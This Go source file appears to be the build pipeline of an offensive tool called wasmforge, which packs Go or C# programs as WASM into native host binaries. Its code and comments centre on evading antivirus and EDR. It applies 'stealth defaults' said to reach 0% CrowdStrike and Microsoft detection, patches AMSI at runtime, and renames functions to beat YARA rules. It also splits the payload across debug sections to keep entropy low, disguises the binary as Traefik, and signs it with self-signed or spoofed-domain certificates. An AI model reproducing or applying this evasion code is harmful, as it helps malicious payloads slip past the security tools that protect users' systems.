package build

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/praetorian-inc/wasmforge/internal/dotnet/compile"
)

// PEMetadata holds custom PE VERSIONINFO fields for the Windows host binary.
// When empty, neutral defaults are used to avoid fingerprinting.
type PEMetadata struct {
	CompanyName  string
	ProductName  string
	Description  string
	Copyright    string
	InternalName string
	FileVersion  string
}

// Options configures the build pipeline.
type Options struct {
	// Package is the Go package to compile (e.g., "./cmd/scanner" or a file path).
	Package string
	// Output is the path for the final binary.
	Output string
	// RawSockets enables raw socket support in the host.
	RawSockets bool
	// Win32APIs enables Win32 API support in the host.
	Win32APIs bool
	// DarwinAPIs enables Darwin/macOS framework support in the host.
	DarwinAPIs bool
	// FSMounts lists host directories to mount into WASM.
	FSMounts []string
	// Verbose enables detailed build output.
	Verbose bool
	// PE holds custom PE VERSIONINFO metadata for the Windows host binary.
	PE PEMetadata
	// SignMode controls Authenticode code signing.
	// "" = auto (self-sign for Windows), "self" = self-signed, anything else = domain name for spoofed cert.
	SignMode string
	// NoSign disables the default auto-signing behavior for Windows targets.
	NoSign bool
	// BuildTags are extra Go build tags to pass to the WASM compilation step.
	BuildTags string
	// Ghost is the name of the ghost profile to use for gopclntab camouflage
	// (e.g., "traefik", "caddy"). When empty, a random embedded profile is used
	// if available, otherwise the default word-list names are used.
	Ghost string
	// NativeAOT enables NativeAOT-WASI-specific host functions (WMI, SDDL, LSA,
	// RPC, WASI P2 stubs). The host binary is compiled with -tags nativeaot.
	NativeAOT bool
	// NoAMSIPatch disables the runtime AMSI patch. Go payloads don't need it;
	// skipping it avoids Elastic Defend's AMSI-bypass behavioral alerts.
	NoAMSIPatch bool
	// PrecompiledWASM, when set, skips the Go→WASM compilation step and uses
	// the specified WASM file directly. Used for NativeAOT-WASI modules that
	// are compiled externally (e.g., .NET NativeAOT-LLVM).
	PrecompiledWASM string
	// MigrateFunc, when set, is called to migrate a .NET Framework project
	// to .NET 10 NativeAOT-WASI before compilation. Set by the CLI layer
	// to avoid internal/build importing internal/dotnet/migrate.
	MigrateFunc func(sourceDir string, verbose bool) error
}

// Run executes the full wasmforge build pipeline:
// 1. Prepare patched GOROOT
// 2. Compile Go → WASM
// 3. Generate host binary (embeds WASM)
func Run(opts Options) error {
	// Apply R80 stealth defaults (chunked payload + IAT_RE27 + Go-marker
	// scrambling + zlib compress + strip + enrich-disable + PE normalize +
	// Traefik ghost). These were proven 0% CrowdStrike + 0% Microsoft at
	// N=42 on the R80 VT campaign with the manifest-placement stability fix
	// (commit 59bc185). Set WASMFORGE_RAW_BUILD=1 to disable all stealth
	// transforms for debug / dev builds.
	applyR80Defaults(&opts)

	// Auto-enable platform API bridges based on target GOOS. Every Windows
	// guest needs --win32-apis to talk to the OS at all, and every macOS
	// guest needs the framework bridge — making users remember the flag is
	// pure friction. Both flags still work as explicit overrides for the
	// rare case where you want the bridge off (smaller binary, fewer
	// signatures); they no longer have to be passed for the common case.
	autoTargetGOOS := os.Getenv("GOOS")
	if autoTargetGOOS == "" {
		autoTargetGOOS = runtime.GOOS
	}
	if autoTargetGOOS == "windows" {
		opts.Win32APIs = true
	}
	if autoTargetGOOS == "darwin" {
		opts.DarwinAPIs = true
	}

	// Auto-detect C# projects and route through the NativeAOT-WASI pipeline.
	// When a directory contains .csproj instead of go.mod, the C# path
	// compiles to WASM via dotnet publish, then feeds into the standard
	// post-compilation pipeline (host generation, PE postprocess, signing).
	if opts.PrecompiledWASM == "" && opts.Package != "" {
		ptype, detectErr := DetectProjectType(opts.Package)
		if detectErr == nil && ptype == ProjectCSharp {
			if err := CheckCSharpPrereqs(opts.Verbose); err != nil {
				return err
			}
			if needsMigration(opts.Package) && opts.MigrateFunc != nil {
				if opts.Verbose {
					fmt.Fprintf(os.Stderr, "wasmforge: auto-migrating .NET Framework project...\n")
				}
				if err := opts.MigrateFunc(opts.Package, opts.Verbose); err != nil {
					return fmt.Errorf("auto-migration: %w", err)
				}
			}

			dotnetTmpDir, err := os.MkdirTemp("", "wasmforge-dotnet-compile-*")
			if err != nil {
				return fmt.Errorf("creating dotnet temp dir: %w", err)
			}
			defer os.RemoveAll(dotnetTmpDir)

			result, err := compile.CompileCSharpToWASM(compile.Config{
				SourceDir: opts.Package,
				OutputDir: dotnetTmpDir,
				Verbose:   opts.Verbose,
			})
			if err != nil {
				return fmt.Errorf("C# compilation: %w", err)
			}

			// Route through existing precompiled WASM pipeline. Win32APIs was
			// already auto-enabled at the top of Run() for Windows targets.
			opts.PrecompiledWASM = result.WASMPath
			opts.NativeAOT = true

			if opts.BuildTags != "" && opts.Verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: warning: --tags is ignored for C# projects\n")
			}
		}
	}

	// Auto-enable NativeAOT APIs when using a precompiled WASM file.
	if opts.PrecompiledWASM != "" && !opts.NativeAOT {
		opts.NativeAOT = true
	}

	// Step 1: Patched GOROOT (skipped when using a precompiled WASM — the Go
	// compiler is not invoked so patching is unnecessary).
	var patchedGOROOT string
	if opts.PrecompiledWASM == "" {
		var err error
		patchedGOROOT, err = PatchedGOROOT(opts.Verbose, opts.Win32APIs)
		if err != nil {
			return fmt.Errorf("preparing GOROOT: %w", err)
		}
	}

	// Step 2: Create temp dir for intermediate files.
	tmpDir, err := os.MkdirTemp("", "wasmforge-build-*")
	if err != nil {
		return fmt.Errorf("creating temp dir: %w", err)
	}
	if os.Getenv("WASMFORGE_KEEP_DIR") == "" {
		defer os.RemoveAll(tmpDir)
	} else {
		fmt.Fprintf(os.Stderr, "wasmforge: DEBUG keeping tmpDir at %s\n", tmpDir)
	}

	// Determine target platform from environment (for source-level rewriting).
	// Win32APIs/DarwinAPIs were auto-enabled from GOOS at the top of Run().
	targetGOOS := autoTargetGOOS
	targetGOARCH := os.Getenv("GOARCH")
	if targetGOARCH == "" {
		targetGOARCH = runtime.GOARCH
	}

	// Step 2.5: Per-build GOROOT overlay — randomize patched stdlib function
	// names (e.g., interfaceAddrTable) to prevent YARA matching on gopclntab
	// entries. Creates a temp GOROOT that symlinks everything to the cache
	// except src/net/ which gets a fresh copy with renamed functions.
	// Skipped when using a precompiled WASM (no Go compilation occurs).
	if opts.PrecompiledWASM == "" {
		patchedGOROOT, err = randomizeGOROOTNetFunctions(patchedGOROOT, tmpDir, opts.Verbose)
		if err != nil {
			return fmt.Errorf("randomizing net functions: %w", err)
		}
	}

	// Step 3: Get WASM binary — either compile from Go source or use precompiled.
	var wasmPath string
	if opts.PrecompiledWASM != "" {
		// NativeAOT path: WASM was compiled externally (e.g., .NET NativeAOT-LLVM).
		// Skip Go compilation entirely.
		wasmPath = opts.PrecompiledWASM
		if opts.Verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: using precompiled WASM: %s\n", wasmPath)
		}
	} else {
		var err2 error
		wasmPath, err2 = CompileWASM(patchedGOROOT, opts.Package, tmpDir, opts.Verbose, opts.Win32APIs, targetGOOS, targetGOARCH, opts.BuildTags)
		if err2 != nil {
			return err2
		}
	}

	// Step 4: Determine output path.
	output := opts.Output
	if output == "" {
		output = filepath.Base(opts.Package)
		if output == "." || output == "/" {
			output = "app"
		}
	}

	// Make output path absolute.
	if !filepath.IsAbs(output) {
		cwd, _ := os.Getwd()
		output = filepath.Join(cwd, output)
	}

	// Step 5: Generate host binary.
	hostCfg := HostConfig{
		RawSockets:  opts.RawSockets,
		Win32APIs:   opts.Win32APIs,
		DarwinAPIs:  opts.DarwinAPIs,
		NativeAOT:   opts.NativeAOT,
		NoAMSIPatch: opts.NoAMSIPatch,
		FSMounts:    opts.FSMounts,
		PE:          opts.PE,
		Ghost:       opts.Ghost,
	}

	if err := GenerateHost(wasmPath, output, tmpDir, hostCfg, opts.Verbose); err != nil {
		return err
	}

	// Step 6: Post-process PE (import enrichment + checksum).
	if isTargetingWindows() {
		if err := postProcessPE(output, opts.Verbose); err != nil {
			if opts.Verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: warning: PE post-processing: %v\n", err)
			}
			// Non-fatal — binary is still functional without enriched imports.
		}
		// Step 6.1: Optionally scramble Go runtime fingerprints
		// (\xff Go build ID: and \xff Go buildinf: markers). VT R53 analysis
		// 2026-06-12 showed these are universal Go signatures present at
		// known offsets in every Go binary. CrowdStrike may use them as
		// YARA-style anchors for byte-pattern matching.
		if os.Getenv("WASMFORGE_SCRAMBLE_GO_MARKERS") == "1" {
			if err := scrambleGoMarkers(output, opts.Verbose); err != nil && opts.Verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: warning: Go marker scramble: %v\n", err)
			}
		}
	}

	// Step 6.5: Inject deferred PE payload (MUST be after postProcessPE).
	// Distributes the payload across existing .zdebug_* sections to maintain
	// natural size ratios found in legitimate Go binaries. Falls back to
	// adding a new section if distribution fails.
	if isTargetingWindows() {
		payloadPath := output + ".payload"
		metaPath := output + ".payload.meta"
		if payloadData, err := os.ReadFile(payloadPath); err == nil {
			metaData, _ := os.ReadFile(metaPath)
			lines := strings.SplitN(string(metaData), "\n", 4)
			sectionName := ".zdebug_ranges"
			marker := uint32(0)
			if len(lines) > 0 && lines[0] != "" {
				sectionName = lines[0]
			}
			if len(lines) > 1 {
				fmt.Sscanf(lines[1], "%d", &marker)
			}
			// Parse the per-build PayloadKey (line 3, hex-encoded).
			var payloadKey [32]byte
			if len(lines) >= 4 && len(lines[3]) >= 64 {
				keyBytes, kerr := hex.DecodeString(strings.TrimSpace(lines[3])[:64])
				if kerr == nil && len(keyBytes) == 32 {
					copy(payloadKey[:], keyBytes)
				}
			}

			// WASMFORGE_CHUNK_PAYLOAD=1: use new chunked distribution (split
			// across 6 sections with filler to keep each section's entropy <7.0).
			chunked := false
			if os.Getenv("WASMFORGE_CHUNK_PAYLOAD") == "1" {
				if _, err := chunkAndDistributePayload(output, payloadData, payloadKey, opts.Verbose); err != nil {
					if opts.Verbose {
						fmt.Fprintf(os.Stderr, "wasmforge: chunk-distribute failed (%v), falling back\n", err)
					}
				} else {
					chunked = true
				}
			}

			// Try distributed injection first (appends to existing debug sections).
			// WASMFORGE_SKIP_DISTRIBUTE=1 forces single-section mode for testing.
			skipDistribute := os.Getenv("WASMFORGE_SKIP_DISTRIBUTE") == "1"
			distributed := chunked
			if !chunked && !skipDistribute {
				if err := distributePayloadAcrossSections(output, payloadData, marker, opts.Verbose); err != nil {
					if opts.Verbose {
						fmt.Fprintf(os.Stderr, "wasmforge: distributed injection failed (%v), using single section\n", err)
					}
				} else {
					distributed = true
				}
			} else if !chunked && opts.Verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: WASMFORGE_SKIP_DISTRIBUTE=1, using single section\n")
			}
			if !distributed {
				// Fallback: add as a single new section.
				if err := addPayloadSection(output, payloadData, sectionName, opts.Verbose); err != nil {
					return fmt.Errorf("injecting payload section: %w", err)
				}
			}

			// Recompute PE checksum — payload injection invalidated the
			// checksum computed in Step 6 (postProcessPE).
			if recheckData, err := os.ReadFile(output); err == nil {
				if recheckData, err = fixPEChecksum(recheckData); err == nil {
					if err := os.WriteFile(output, recheckData, 0o755); err != nil && opts.Verbose {
						fmt.Fprintf(os.Stderr, "wasmforge: warning: checksum rewrite failed: %v\n", err)
					}
				}
			}
			os.Remove(payloadPath)
			os.Remove(metaPath)
		}
	}

	// Step 7: Authenticode code signing (must be last — signing invalidates checksum).
	// Default to self-signing for Windows targets unless explicitly disabled.
	// VT testing (2026-03-17) confirms signing eliminates CrowdStrike + Symantec
	// detections: 0/76 signed vs 2/76 unsigned. The ~1.5KB overlay from the
	// WIN_CERTIFICATE is not flagged by Avast/AVG on current builds.
	signMode := opts.SignMode
	if signMode == "" && isTargetingWindows() && !opts.NoSign {
		signMode = "self"
	}
	if signMode != "" {
		mode := SignMode(signMode)
		domain := ""
		if mode != SignSelf {
			if !strings.Contains(signMode, ".") {
				return fmt.Errorf("invalid --sign value %q: use 'self' or a domain name (e.g., 'google.com')", signMode)
			}
			domain = signMode
			mode = SignDomain
		}
		if err := signBinary(output, mode, domain, opts.Verbose); err != nil {
			// Non-fatal for auto-signing — osslsigncode may not be installed.
			if opts.SignMode == "" {
				if opts.Verbose {
					fmt.Fprintf(os.Stderr, "wasmforge: warning: auto-signing skipped: %v\n", err)
				}
			} else {
				return fmt.Errorf("code signing: %w", err)
			}
		}
	}

	if opts.Verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: build complete → %s\n", output)
	}

	return nil
}

// applyR80Defaults sets the env vars and opts that drive the R80 stealth
// recipe (proven 0% CrowdStrike + 0% Microsoft at N=42 on the R80 VT
// campaign). The function ONLY writes env vars / opts that the caller hasn't
// already chosen — explicit user settings always win.
//
// Disable all stealth defaults by setting WASMFORGE_RAW_BUILD=1. Disable a
// specific transform by setting its env var to "0".
func applyR80Defaults(opts *Options) {
	if os.Getenv("WASMFORGE_RAW_BUILD") == "1" {
		return
	}
	setIfUnset := func(k, v string) {
		if _, present := os.LookupEnv(k); !present {
			_ = os.Setenv(k, v)
		}
	}
	// Payload distribution + compression (the AV-evasion core).
	setIfUnset("WASMFORGE_CHUNK_PAYLOAD", "1")
	setIfUnset("WASMFORGE_EMBED_COMPRESS", "1")
	// Go runtime fingerprint scrubbing — only applies to Go host binaries.
	setIfUnset("WASMFORGE_PATCH_IAT_RE27", "1")
	setIfUnset("WASMFORGE_SCRAMBLE_GO_MARKERS", "1")
	// PE structural hygiene.
	setIfUnset("WASMFORGE_STRIP", "1")
	setIfUnset("WASMFORGE_PE_NORMALIZE", "1")
	setIfUnset("WASMFORGE_NO_ENRICH", "1")
	// Don't pull in NativeAOT-only host functions when building a Go binary.
	// The NativeAOT path explicitly clears this below.
	setIfUnset("WASMFORGE_NO_NATIVEAOT_HOST", "1")
	if opts.NativeAOT {
		// NativeAOT host needs the NativeAOT-specific functions; the
		// no-host default would strip exactly those. Force it off here so
		// the NativeAOT pipeline still gets WMI/SDDL/LSA/RPC bridges.
		_ = os.Setenv("WASMFORGE_NO_NATIVEAOT_HOST", "0")
	}
	// Traefik ghost profile (proven safest-looking gopclntab camouflage).
	if opts.Ghost == "" {
		opts.Ghost = "traefik"
	}
}
